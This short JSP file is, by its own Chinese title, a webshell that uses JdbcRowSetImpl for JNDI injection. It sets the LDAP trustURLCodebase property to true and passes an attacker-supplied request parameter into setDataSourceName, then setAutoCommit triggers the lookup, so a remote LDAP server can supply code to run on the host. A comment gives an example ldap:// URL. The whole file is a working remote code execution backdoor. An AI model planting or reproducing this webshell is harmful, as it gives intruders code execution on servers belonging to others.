<%@ page import="com.sun.rowset.JdbcRowSetImpl" %>
<html>
<body>
<h2>JdbcRowSetImpl进行jndi注入的JSP Webshell</h2>
<%
    System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase","true");
    JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();
    jdbcRowSet.setDataSourceName(request.getParameter("threedr3am"));//ldap://localhost:43658/Calc
    try {
        jdbcRowSet.setAutoCommit(true);
    } catch (Throwable e) {
        response.getOutputStream().write(e.getCause().getMessage().getBytes());
    }
%>
</body>
</html>